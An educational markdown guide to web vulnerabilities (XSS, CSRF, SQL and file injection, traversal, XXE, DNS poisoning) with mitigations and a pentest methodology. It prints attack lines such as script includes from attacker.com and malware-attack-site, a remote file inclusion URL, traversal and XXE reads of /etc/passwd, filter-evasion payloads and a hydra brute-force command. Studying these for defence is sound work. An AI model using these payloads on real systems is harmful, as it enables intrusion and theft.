# Common Web Vulnerabilities

Although nomenclatures don't help much when you are facing a security problem, I am keeping this list for a systematic organization. It has regularly been updated.



## Cross-site Scripting (XSS)

XSS is caused by **insufficient input validation or output escaping**. This vulnerability can allow an attacker to insert HTML markup or scripts in a vulnerable website. The injected code will have plenty of access in this site, and in many cases, to the HTTP cookies stored by the client.


HTML has five characters that are reserved:

* **both angle brackets**,

* **single and double quotes**,

* and **ampersand**.

The ampersand should never appear in most HTML sections. Both angle brackets should not be used inside a tag unless adequately quoted. Quote characters inside a tag can also be harmless in text.

To allow these characters to appear in problematic locations, an encoding based in an ampersand-prefixed and a semicolon-terminated scheme is used: the [Entity Encoding](http://www.w3schools.com/html/html_entities.asp).


### Non-Persistent Attack:

XSS non-persistent attacks consist of getting users to click a link with attacker's script. A typical scenario is the following:

1. The target website performs query searches that are not sanitized. For example, the query could accept scripts on it. A simple example to check this vulnerability is by verifying whether the alert box with the message **Pwnd** is displayed:
```
http://website.org?q=<script%20type='text/javascript'>alert('Pwnd!');</script>
```

2. The attacker crafts an exploit script that gets the victim's authorization information (for example in an **Authorization Cookie**). The attacker sends a **phishing email** to the victim with a link with some script such as:

```
http://website.org?q=puppies<script%20src="http://attacker.com/exploit.js">
```

3. If the victim clicks on the link, her/his browser runs the script (legitimate by the **Same Origin Policy**, * i.e.* resources are shared between origins with the same protocol, domain, and port). The attacker now has control of the victim's identity on that website. If the victim is the administrator, it is game over.


### Persistent Attack:

XSS persistent attacks store a malicious script in the databases, which will be retrieved by the users. A typical scenario is the following:

1. The attacker verifies that the target website has an XSS stored vulnerability (for example, allowing her/him to post text with HTML tags).

2. The attacker creates an account in the target website and posts something with a hidden script (similar to the one above).

3. When anyone loads the page with that post, the script runs, and the attacker is able to hijack the victim's section.


Additionally, in *password managers*, there is a risk of amplification of XSS bugs. In the web applications that use *[httponly](https://www.owasp.org/index.php/HttpOnly)* cookies, successful exploitation of an XSS flaw may give the attacker transient access to the user's account (and password).



### Attempts of mitigation:

* Servers should use **Content Security Policy** (CSP) HTTP header, which allows the whitelist of resources contents. For instance, the *Content-Security-Policy* header disables inline JavaScript by default.

* Servers can use the **HttpOnly** HTTP header which allows setting a cookie that is unavailable to client-side scripts.

* Search inputs should *always* be sanitized in both server-side and client-side.

* Servers should redirect invalid requests.

* Servers should invalidate sessions from different IP addresses. However, this can be mitigated if the attacker is behind a web proxy or behind the same NAT IP.

* Clients should disabling scripts by default (for example with [NoScript](https://addons.mozilla.org/en-us/firefox/addon/noscript/)).




---
## Cross Script Inclusion (XSSI)


XSSI comes with the failure to secure sensitive JSON-like responses against being loaded on third-party sites via ```<script src=..>```, and leaking user-specific information in the response. It a risk whenever ambient authority credentials (such as cookies) are used by the server to generate user-specific JavaScript code.

For instance, JSON is a JavaScript syntax structure to keep in-place object serialization. The curly bracket **{** is assumed to be the beginning of the object. Overloading curly brackets means that JSON blocks will not be adequately recognized in standalone statements.

---
## Cross-site Request Forgery (CSRF, XSRF)

CSRF allows attackers to execute actions using the credentials of another user without that user's knowledge or consent. It is the failure to verify that a particular state-changing HTTP request received by the **server-side** portion of the application was initiated from the expected **client-side** origin. Any third-party website loaded in the browser can perform actions on behalf of the victim.


On cross-domain navigation, the browser includes any ambient credentials. To the server, a request originating from its own client-side code will appear as the same as the request from a rogue third-party site, and it might be granted the same privilege.


### Examples of exploitation:

* Any two windows with frames opened in a browser will remain **Same Origin** with each other even if the user logs out from one account and permitting third-party to submit password and username and log int an attacked account. For example, the attacker can open and keep a frame pointing to a sensitive page and then log the victim into the attacker-controlled account to execute some code injection. Despite the change of HTTP credentials, the code injected will access the previous loaded frame.

* In several home network routers, CSRF can permit attackers to access the device and intercept or modify the network traffic.


### Attempts of mitigation:

* A protection can be done by checking a nonce in each POST request (no replay attacks in a form POST).

* Including a secret user- and session-specific value on the requests (as an additional query parameter or a hidden field). The attacker will not be able to read the value since access to cross-domain documents is restricted by the **same-origin** policy.


----
## Header Injection (Response Splitting)

Insufficient escaping of newlines in HTTP responses, generated by the server-side. This can lead to XSS or proxy cache poisoning.

### Attempts of mitigation:

* LF and CR characters must be stripped from any attacker-controlled values in the HTTP headers.

---
## Mixed Content

Loading non-HTTPS sub-resources on HTTPS pages undoes most of the benefits of encryption. For scripts and applets, this makes the application vulnerable to active attackers, especially in open wireless networks.

---
## Open Redirection

Applications that perform HTTP- or script-based requests to user-supplied URLs without constraining the possible destinations in any meaningful way, leading, for example, to XSS.

---
## Referer Leakage

HTTP requests may include a *Referer* header that contains the URL of documents that triggered the current navigation in some way. The header also may reveal some information about the user browsing habits, such as query parameters in the referring page.

This vulnerability is created by disclosure of a sensitive URL by embedding an off-site sub-resource of providing an off-site link. Any security data encoded in the URL of the parent document will be leaked in the *Referer* header.


---
# Vulnerabilities to Web Application Design

## Cache Poising

Long-term pollution of the browser cache (or any proxy within) with a malicious version of the targeted web application. Encrypted web applications may be targeted due to response-splitting vulnerabilities. In non-encrypted traffic, network attackers may be able to modify responses too.

---
## Clickjacking
The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to another site. For example, a malicious site wraps another site in a frame.

If a website includes iframe, there is a chance that it can perform a SQL query searching for iframe code. For example:

```
SELECT * FROM blog_posts WHERE post_text LIKE '%>iframe%';
```


---
## Content and Character Set Sniffing

The possibility that the browser will ignore any authoritative content type of character set information provided by the server, and interpret the returned document incorrectly.

### Examples of exploitation:

* Scenarios where [Content-Type](http://www.w3.org/Protocols/rfc1341/4_Content-Type.html) is ignored.


---
## Cookie Forcing/Injection

The possibility of blindly injecting HTTP cookies into the context of an otherwise impenetrable web application due to issues in how the mechanism is designed and implemented in browsers. There is a special concern to HTTPS applications.

### Examples of exploitation:

* Cookie stuffing: deleting cookies belonging to other applications by overflowing the cookie jar.

---
## Denial-of-Service (DoS)

Any opportunity of the attacker to bring down a browser or server, or make the use of a targeted application more difficult.


### DoS and amplification attacks

DNS resolvers are attractive targets to attackers who exploit the resolvers' large response-to-request size ratio to gain additional free bandwidth. Resolvers that support EDNS0 (Extension Mechanisms for DNS) are especially vulnerable because of the substantially larger packet size that they can return.

### Examples of exploitation:

In an amplification scenario, the attack proceeds as follows:

* The attacker sends a victim DNS server queries using a forged source IP address. The queries may be sent from a single system or a network of systems all using the same forged IP address. The queries are for records that the attacker knows will result in much larger responses, up to several dozen times1 the size of the original queries..
* The victim server sends the large responses to the source IP address passed in the forged requests, overwhelming the system and causing a DoS situation.


---
## Framebusting

The possibility of a framed page navigating the top-level document to a new URL without having to satisfy **same-origin** checks. It might be exploited for phishing.

---
## HTTP Downgrade

Ability of an attacker to prevent the user from reaching an HTTPS version of a site or to downgrade an existing HTTPS session to HTTP.

### Attempts of mitigation:

* [Strict transport security](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security): The approach allows any site to instruct the browser that all future requests made to a particular hostname or domain should always use HTTPS and that any HTTP traffic should be automatically upgraded and submitted over HTTPS.


----
## Network Fenceposts

When websites let the browser to interact with destinations not directly accessible to the attacker, for example, with the systems on a victim's internal networks. This attack can be performed with the help of [DNS rebinding](http://en.wikipedia.org/wiki/DNS_rebinding).

### Attempts of mitigation:

* Internet Explorer implements the zone model, a potential approach to the risk.



---

# Vulnerabilities in the Server-Side

## Buffer Overflow

In low-level languages such as C or C++, buffer overflow happens when a program allows more information to be stored in a particular memory region than there is space to accommodate the incoming data, leading to the unexpected overwrite of other vital data structures.

---
## Command Injection (SQL, PHP, Shellcode)

Due to insufficient input filtering or output escaping, attacker-controlled strings may be processed as statements in an interpreted language used by the application.

### Examples of exploitation:

* Malicious code injections in an iframe to the attack site:
```
<iframe frameborder="0" height="0" src="http://<attack-site>/path/file" style="display:none" width="0"></iframe>
```

* JavaScript or another scripting language that calls and runs scripts from an attack site:

```
<script type='text/javascript' src='http://malware-attack-site/js/x55.js'></script>
```

* Scripts that redirects the browser to an attack site:
```
<script>
 if (document.referrer.match(/google\.com/)) {
 window.location("http://malware-attack-site/");
 }
</script>
```

* Malicious code that is obfuscated to avoid detection:

```
eval(base64_decode("aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf"));
```

* Shared object files designed to write harmful code to otherwise benign scripts randomly:

```
#httpd.conf modified by the hacker
LoadModule harmful_module modules/mod_harmful.so
AddModule mod_harmful.c
```

* The **Error template type of malware infection** occurs when the template used for error messages, such as 404 File not Found, is configured to distribute malware. In this way, attackers can launch attacks on URLs that do not even exist on the victim's website.

### Attempts of mitigation:
* Investigate all possible harmful code on the website. It may be helpful to search for words like [iframe] to find iframe code. Other helpful keywords are "script", "eval", and "unescape." For example, on Unix-based systems:

```sh
$ grep -irn "iframe" ./ | less
```




----
## Directory Traversal

Due to insufficient filtering (such as the failure to recognize ```../``` segments) an application can be tricked into reading or writing files at arbitrary locations. Unconstrained file-writing bugs can be exploitable to run attacker-supplied code.


---
## File Inclusion

If used without a qualifier or prefixed with a *local* (LFI), the term is synonymous to read-related directory traversal. Remote file inclusion (RFI) is an alternative way to exploit file-inclusion vulnerabilities by specifying a URL rather than a valid file path. In some languages, a common API opens local files and fetches remote URLs, which might supply the ability to retrieve the attacker's files.


----
## Format String Vulnerability

Several libraries accept templates (format strings) followed by a set of parameters that the function is expected to insert into the template at predefined locations. For example, C has functions such as *printf*, *syslog*, etc. The vulnerability is caused by permitting attackers to supply the template to one of these functions. This can lead to data leaks and code execution.


---
## Integer Overflow

Vulnerability specific to languages with no range checking. The flaw is caused by the developer failing to detect that an integer exceeded the maximum possible value and rolled back to zero, to a large negative integer, or to some hardware-specific result.

Integer underflow is the opposite effect: crossing the minimum value and rolling over to a very large positive integer.


---
## Pointer Management Vulnerabilities

In languages that use raw memory pointers such as C or C++, it is possible to use pointers that are either unitized or nor longer valid (dangling). These vulnerabilities will corrupt the internal state of the program and allow an attacker to execute attacker-supplied code.


---
## Cache poisoning attacks

Several variants of DNS spoofing attacks that can result in cache poisoning.

### Example of Attack

1. The attacker sends a target DNS resolver multiple queries for a domain name for which she/he knows the server is not authoritative, and that is unlikely to be in the server's cache.

2. The resolver sends out requests to other nameservers (whose IP addresses the attacker can also predict).

3. In the meantime, the attacker floods the victim server with forged responses that appear to originate from the delegated nameserver. The responses contain records that ultimately resolve the requested domain to IP addresses controlled by the attacker. They might contain answer records for the resolved name or, worse; they may further delegate authority to a nameserver owned by the attacker, so that s/he takes control of an entire zone.

2. If one of the forged responses matches the resolver's request (for example, by query name, type, ID and resolver source port) and is received before a response from the genuine nameserver, the resolver accepts the forged response and caches it, and discards the genuine response.

5. Future queries for the compromised domain or zone are answered with the forged DNS resolutions from the cache. If the attacker has specified a very long time-to-live on the forged response, the forged records stay in the cache for as long as possible without being refreshed.


----

# References:

* [The Tangled Web](http://www.amazon.com/The-Tangled-Web-Securing-Applications/dp/1593273886)
* [Django Security](https://docs.djangoproject.com/en/dev/topics/security/)
* [Bleach: Sanitizing Tool in Python](https://docs.djangoproject.com/en/dev/topics/security/)
* [Google's Public DNS](https://developers.google.com/speed/public-dns/docs/security)



---

# Tools

### urllib2

- simple GET, POST, header, authentication scripts
- Scanning CMS suites installations
- Brute force directories and file locations
- Brute force HTML form authentication

### OS Command Injection

- Brute force password

### SQLi

- Brute force password
- Timed SQLi
- Cookie force brute


### PHP Shellcodes

- php primer
- xor
- exploits

### User ID
- cookie auth
- user id

### Phishing

- log.php


### Scanners

- heartbleed





---

## Steps of web exploitation:

### 1) Information Gathering

* creation of dictionary: with **cewl.rb**/

* download website: **wget -rck**, **httrack**:
```
$ wget -rck <TARGET-WEBSITE>
```
* identification of email accounts: with **theharverster**, **maltego**, **msfcli (metasploit)**.

* extract metadata: with **Metagoofil** and **FOCA**. It also can be done with googling qith ```site: www.url.com ext:pdf intitle:"Documents and settings"```.

* a search for other domains that are hosted on the same IP  (virtual host): with **revhosts**.

* Tips:

	* If a database is involved -->  SQL injection.

	* If the input is used in the website --> XSS vulnerability.


### 2) Automatic Testing (scanners)

* Tools: **Nikto**, **w3af**, **skipfish**, **Arachni**, **ZAP**/

* spidering: **GoLISMERO**.

* interesting files: search for robots.txt, gitignore, .svn, .listin, .dstore, etc. Tool: **FOCA**.

* brute force folders and files: **dirb** and **dirbuster**.

* fuzzing to the various parameters, directories and others, in order to identify different types of vulnerabilities such as: XSS, SQLi, LDAPi, Xpathi, LFI, or RFI. Tool: **PowerFuzzer**, **Pipper** or ***Burpproxy***. A good fuzzy dictionary is **fuzzdb**.


### 3. Manual testing

* testing vulnerabilities: Burpproxy, ZAP, sitescope.

* identify components and plugins that have enabled the Website, as might be the following types of CMS (Content Management Systems): Joomla Component, Wordpress plugin, Php-Nuke, drupal, Movable Type, Custom CMS, Blogsmith/Weblogs, Gawker CMS, TypePad, Blogger/Blogspot, Plone, Scoop, ExpressionEngine, LightCMS, GoodBarry, Traffik, Pligg, Concrete5, Typo3, Radiant CMS, Frog CMS, Silverstripe, Cushy CMS etc. Then find known vulnerabilities and **/** associated with it. Tools: **joomla Scan** or **cms-explorer**.

* headers, http methods, sessions, certifications: we could use any tool like a proxy or a simple telnet connection to the Website.
* fingerprinting to identify the architecture and configuration of the site: **httprint**.

* manipulation of parameters  to identify any errors and / or vulnerabilities. We can use any proxy to manipulate the requests. Alteration of the normal operation of the application by: single quotes, nulls values “%00”, carriage returns, random numbers, etc.

* analysis of Flash, Java, and other files: identify and download all flash files that exist on the Website. To do this, we could use the Google search: ```filetype:swf site:domain.com```. We could also use wget tool:

```
$ /wget -r -l1 -H -t1 -nd -N -nd -N -A.swf -erobots=off <WEBSITE> -i output_swf_files.txt
```

* Once we have identified and downloaded *.swf files, we must analyze the code, the functions (as *loadMovie*) variables in order to identify those that call and allow other types of vulnerabilities such as cross site scripting. Below shows some vulnerable functions:

```
_root.videourl = _root.videoload + '.swf';
video.loadMovie(_root.videourl);
getURL - payload. javascript:alert('css') getURL (clickTag, '_self')
	load* (in this case: loadMovie) - payload: as
function.getURL,javascript:alert('css')
	TextField.html - payload: <img src='javascript:alert("css")//.swf'>
```

* We could use tools such as **Deblaze** and **SWFIntruder**. We should also analyze the parameter AllowScriptAccess, Flash Parameter Pollution or sensitive APIs:

```
loadVariables, loadVariblesNum, MovieClip.loadVariables, loadVars.load, loadVars.sendAndLoad
XML.load, XML.sendAndLoad
URLLoader.load, URLStream.load
LocalConnection
ExternalInterface.addCallback
SharedObject.getLocal, SharedObject.getRemote
```

* authentication system: the first thing is to determine if the website stored the credentials in the browser. This could be exploited with attacks on defaults accounts and dictionary attacks. The default accounts are: admin, administrator, root, system, user, default, name application. We can use **hydra** for this:

```
$ hydra -L users.txt -P pass.txt <WEBSTE> http-head/private
```



---
## How do You Hack a Web Application

* **Fuzz testing**: what happens when unexpected data is sent into the application?
* **Authentication testing**: are authentication requirements always enforced?
* **Authorization testing**: can authorization be bypassed?
* **Information disclosure**: is information disclosed that might help compromise the application.


### Web Testing Methodology:

- Map the attack surface:
	* Crawl and inventory all requests and responses.
	* Follow all links.
	* Fill in every form with valid data.
	* Unauthenticated/Authenticated.
	* Unprivileged/Privileged.

- Identify key requests, functionality during crawl.

- Use logs as input for fuzzing GET & POST parameters.

- Use authenticated log to uncover unprotected resources.

- Use privileged log to uncover resources without proper authorization.

- Analyze logs for other potential weakness.


---

### When we have a Website/IP Address:

- Try to add folders to the domain, such as http://csaw2014.website.com or http://key.website.com.

- We brute force the subdomains, for example, with [subbrute.py]. This tool performs multi-threaded DNS lookups to a configurable list of DNS resolvers, searching through a list of possible subdomains.

- Use the command ```dig``` or ```ping``` in Linux to find the IP  address of the website.

- *wgetting* the entire website with something like ```wget -e robots=off --tries=40 -r -H -l 4 <WEBSITE>```.

- Check the *robot.txt* file for hidden folders.

- Inspect the DOM using the browser's developer tools to look for HTML comments (plain view-source won't work when the content is loaded through Ajax).


-----

## URLs

### Octal

- Example: http://017700000001 --> 127.0.0.1

- For example 206.191.158.50:

((206 * 256 + 191) * 256 + 158 ) * 256 + 50 = 3468664370.

Now, there is a further step that can make this address even more obscure. You can add to this dword number, any multiple of the quantity 4294967296 (2564)


### Great @

- Everything between "http://" and "@" is completely irrelevant

```
http://doesn'tmatter@www.google.org
http://!$^&*()_+`-={}|[]:;@www.google.com
```

- @ symbol can be represented by its hex code %40
- dots are %2e



----

## HTTP

* HTTP is a stateless protocol based on a series of client requests and web server responses.

* HTTP requests and responses are comprised of Headers, followed by request or response body.


* HTTP requests must use a specific request method.

* HTTP responses contain a Status Code.

* HTTP is a plain-text protocol.

* The first line of a request is modified to include protocol version information and it's followed by zero or more name:value pairs (headers):
	- User-Agent: browser version information
	- Host: URL hostname
	- Accept: supported MIME documents( such as text/plain or audio/MPEG)
	- Accept-Language: supported language codes
	- Referer: originating page for the request

* The headers are terminated with a single empty line, which may be followed by any payload the client wishes to pass to the server (the length should be specified with the Content-Length header).

* The  payload is usually browser data, but there is no requirements.



### GET Method

* Passes all request data **within the URL QueryString**.

```
GET /<URL QUERY STRING> HTTP/1.1
User-Agent:Mozilla/4.0
Host: <WESITE>
<CRLF>
<CRLF>
```

### POST Method

* Passes all request data **within the HTTP request body**.

```
POST /<LINK> HTTP/1.1
User-Agent:Mozilla/4.0
Host: <WEBSITE>
Content-Lenght:16
<CRLF><CRLF>
name=John&type=2
```

### HTTP Status Codes

* 1xx - informational
* 2xx - success. Example: 200: 0K.
* 3xx - redirection. Example: 302: Location.
* 4xx - client error. Example: 403: Forbidden, 401: Unauthorized, 404: Not found.
* 5xx - server error. Example: 500: Internal Server Error.


### Session IDs

* HTTP protocol does not maintain state between requests. To maintain a state, must use a state tracking mechanism such as session identifier (session ID), which is passed within a request to associate requests with a session.

* Session ID's can be passed in these places:
	- URL
	- Hidden Form Field
	- Cookie HTTP Header


### Cookies

* To initiate a session, server sends a Set-Cookie header, which begins with a NAME=VALUE pair, followed by zero or more semi-colon-separated attribute-value pairs (Domain, Path, Expires, Secure).

```
Set-Cookie: SID=472ndsw;expires=DATE;path=/;domain=SITE,HttpOnly
```

* Client sends Cookie header to server to continue session.




----

## Same-Origin Policy

### DOM Same-Origin Policy

* JavaScript executing in context of one document should not be allowed to access context of another document, unless: **protocol, hostname and port all match**. This defines a document's origin.

* IE doesn't always observer port number.

* Wildcard * policies is ill-advised: explore content on your domain to script access from any/all origins.

### Cross-Domain Policies

* Extend SOP beyond a document's origin.
* Permit applets originating from another domain access to resources.
* Permit issuing arbitrary HTTP requests with whitelisted headers.

### CORS - Cross Origin Resource Sharing

* Browser allows XMLHttpRequest's to access response data return from cross-origin requests when:
	- Response contains Access-Control-Allow -Origin header
	- Request's Origin value is defined in set


----

## OWASP TOP 10

1. Injection
2. XSS
3. Broken Authentication and Session management
4. Insecure Direct Object Reference
5. CSRF
6. Security Misconfiguration
7. Insecure Cryptographic Storage
8. Failure to Restrict URL access
9. Insufficient Transport Layer Protection
10. Unvalidated Redirects and Forwards.


----
## Injection Flaws

* Happens when mixing Code and Input in the same context.
* Hostile input is parsed as code by the interpreter.

### SQL Injection

* For example an input text box for username and password. The server-side code can be:
```
String query = "SELECT user_id FROM user_data WHERE name = '  " + input.getValue("userID") + " ' and password = ' " + input.getValue("pwd") + " ' ";
```

* The SQL query interpreted by the SQL Server:

```
SELECT user_id FROM user_data  WHERE name='john' and password='password'
```

* However, if the attacker inputs **password' OR '1'='1**,  no password is required!

* See subfolder SQLi for more information.


----

## CSRF

* Tricks victim's browsers into performing unsuspecting actions.

* Server doesn't verify request was imitated from the expect client-side origin.

* Browser naively submits credentials when attempting to retrieve resources.

* Identification and verification manual of CSRF can be done by checking in the website's forms (usually where most often find this vulnerability).

* To check this, you will need to copy an original request (GET / POST) on a form and then make a change in the parameters and re-send the same request modified. If the server does not return an error, it can be considered that it is vulnerable to
CSRF.

* To perform this task, we can use the tools **csrftester** or **burp** proxy.

* Can be used to exploit admin-only vulnerabilities (router admin pages, etc).

* A simple mitigation, often hard to implement: include secret user/session specific value with request.


### Example of CSRF

1. User logs into account at bank.com
2. In another tab, user visit a site that sources an image from:
```
<img src="http://bank.com/xfer.do?frmACCT=user&toAcct=Attackker&amt=10000"/>
```
3. User's browser sends a GET request from the image.
4. User just transfered 100k into Joe's account.


----

## XSS

* Occurs when untrusted data is sent to the web browser without validating or encoding the content.

* Allows attackers to inject script code into the web browser under the vulnerable site's domain.
	- Steal session cookies and any other data in the DOM.
	- Deface website content or redirect to third party websites.
	- Exploit unpatched web browser or plugin.

* Types:
	- Reflected (Transient): payload from Request directly echoed back in Response.
	- Persistent: payload is stored and rendered back within another page.
	- DOM based: occurs Client-Side due to insecure JavaScript

### Persistent Payload

1. The Attacker upload to the server:
```
GET /VulnerablePage.jsp?p1=<script>evil();</script>
```

2. The victim request:
```
GET /VulnerablePage.jsp
```

3. But she/he gets:
```
<html><body>(...)evil();</script></body></html>
```

### Reflected Payload

1. The victim clicks in some malicious link:
```
<a href="http://website.com/Vuln.jsp?p1=%3cscript%3eevil();%3c/script%3e">Click here!</a>
```
2. The victim's GET request:
```
GET /Vuln.jsp?p1=<script>evil();</script>
```
3. Which returns:
```
<html><body>(...)<script>evil();</script>(..)
```


### XSS Shell & XSS Tunnel

*  XSS backdoor which allows an attacker to control a victim's browser by sending it commands.
* Attacker requests are proxied through XSS shell to perform requests as the victim.
* Enables attacker to bypass IP restrictions and all forms of authentication.

### XSS Identification and exploit techniques

* Reflected: pick your payloads, fuzz, and observe response. [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
* Persistent: include a unique string and grep responses.
* DOM based: analyze JavaScript for objects influenced by user:
	- document.URL
	- document.write
* Bypass weak application filters and output encoding: try different variants:
```
<IMG SRC=javascript:alert('XSS')>// no"or;
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>//no'
```
* Encode attack strings: URL, UTF-8, UTF-7
* Trick browser into using alternative character set (necessity of encoding consistence):
```
<?php
header('Content-Type: text/html; charset=UTF-7');
$string = "<script>alert('XSS');</script>";
$string = mb_convert_encoding($string, 'UTF-7');
echo htmlentities($string);
?>
```

### XSS Defenses

* Validate (whitelist)
* Convert HTML to HTML entity equivalent:
	- < can be represented by &lt; or &#60
	- > can be represented by &gt; or &#63
* Consider context when encoding (JavaScript, inline-HTML, URLs)


---

## Insecure File Handling

* Exploit include directive to execute file of attacker's choice.
* File inclusion is used in a variety of web programming frameworks.
* RFI more common in PHP, but Java and ASP/ASP.NET also susceptible to LFI:

```
<?php $page = $_GET["page"];
include($page); ?>
```
where page is ***http://www.target.com/vuln.php?page=http://www.attacker.com/rooted.php***.

* RFI depends on whether **allow_url_fopen** and **allow_url_include** in php.ini.

* Insecure file uploads: upload fails to restrict file types and files are web accessible.

* Attempt to upload arbitrary file types (.jsp, .aspx, .swf): manipulate Content-Type request header.

* Once uploaded, determine if uploaded content is web accessible. If it is executable on the server, it's game over. If it is downloadable, it can exploit users with malicious content.

* Try blended files:
```
GIF89a(...binary data...)
<?php phpinfo();  ?> (...
```


### Identifying File Handling Bugs

* Fuzz and grep response for file system related messages:
```
qr / ((could not|cannot|unable to) (open|find|access|read)|(path|file) not found) /i;
```

* Analyze requests for parameters passing paths and filenames.

* Try directory traversal, NULL  bytes, etc.
```
/FileDownload?file=reports/SomeReport.pdf
/FileDownload?file=../../etc/passwd%00.pdf
```


###  Meta-character Injection Bugs

* File Input/Output is a common place where meta-character injection comes into play.

* For example if file ="../../../../../etc/passwd" below:

```
$file = $_GET['file'];
$fd = fopen("/var/www/$file");
```
* Even if it had a txt extension it wouldn't matter. The reason is that PHP strings are indiferent to NLL byte, so all  the attacker needs to insert is "../../../../../etc/passwd%00":

```
$file = $_GET['file'];
$fd = fopen("/var/www/$file.txt");
```
* PHP NULL byte insertion and directory traversal are common.


---

## Authentication

* Applications can verify identity based on:

	- Something the user knows: password, passphrase, pin, etc.
	- Something the user has: smartcard, security token, mobile device/
	- Something the user is or does: fingerprint, voice recognition.

* Common authentication methods:
	- HTTP authentication
	- Form-based
	- Kerberos/NTLM
	- Single Sign-on (SSO)
	- Certificate based

### Basic Authentication

* Credentials are Base64 enconded: in the format username:password
* Each subsequent request includes credentials with the Authorization HTTP request header.

* For example, admin:admin is YWRtaW46YWRtaW4=:

```
GET /home.jsp HTTP/1.1
Host: www.acme.com
User-Agent: Mozilla/4.0
Authorization: Basic YWRtaW46YWRtaW4=
```

* Password brute force: if no lockout, automate: **Hydra, Brutus**.


### Bypassing Authentication

#### Server-Side

* Predicting session tokens: what's the character composition of cookie?
* Session hijacking via fixation/trapping: same session cookie used pre and post authentication?
* Exploiting an injection flaw in login routine: SQL Injection.

#### Client-Side

* Does application set persistent authentication cookies: remember me or look for Expires attribute of Set-Cookie header.

* Back button to steal cached credentials (credentials stored in browser memory).

### Weak Authentication

* Does application authenticate requests across all resources?

* Issue direct requests to resources (forceful browsing): guess common file names.

* Inventory resources authenticated & request anonymously.
	- Authenticate, crawl through UI, and record requests, responses.
	- Re-issue those requests unauthenticated and diff responses.



-----

## Authorization

* System of determining whether a user is allowed to access a particular resource.

* Role-based authorization.

* Access decision can be made at:
	- resource level
	- function/method-level
	- record-level

### Authorization Attacks

* Vertical:
	- Elevate to a more privileged user
	- access restricted functionality
	- edit records intend to be read only

* Horizontal:
	- access another user's data

* Parameter manipulation: insecure direct object reference (DB record id's exposed to user).

*  Failure to restrict URL access:
	- protect sensitive functionality by disabling the display of links, buttons, URL, and hidden URL or parameters.
	- forceful browsing is a common attack technique: typically results in vertical escalation, administrative interfaces.


---

## Attacking Web Servers

### XML Web Services

* Facilitate machine to machine interaction:
	- usually implemented as middleware, though sometimes called directly by the client.
	- often implemented using **Simple Object Access Protocol (SOAP)**.
	- request and Response structure defined by *8Web Service Definition language (WSDL).

### Attacking web services

1. Locate the web service endpoint.

	* pay attention to proxy logs
	* look for common web service endpoints: .asmx, .svc, /axis, /axis2

2. Obtain metadata.

	* Try appending **?	WSDL** or **.wsdl** to endpoint URL.
```
<portType>: Operations performed by the web service
<message>: Messages used by the web service
<types>: datatypes used by the web service
<binding>: protocol used by the web service
```

3. Invoke the web service:

	* Issue SOAP requests directly to end point (SoapUI)
	* Fuzz inputs just like any other parameter: same vulnerabilities.

### Exploiting XML Parsers

* Web services often vulnerable to common attacks on XML parsers.
* Entity expansion attacks:
	- Denial of service against XML parser.
	- Infinite recursion occurs during parsing.
* XML External Entity attacks:
	- Information disclosure to almost anything.

### XML External Entity Attacks:

1. Define an XML entity in the DTD
2. Reference defined entity in XML body.
3. Parser will read /etc/passwd contents:

```
<!DOCTYPE test [<!ENTITY x3 System "/etc/passwrd">]>
<body>
<e1>&x3;</e1>
</body>
```





-----------------

## Other Tools
* [FireBug](http://getfirebug.com/)
* [Burp Suite](http://portswigger.net/burp/)
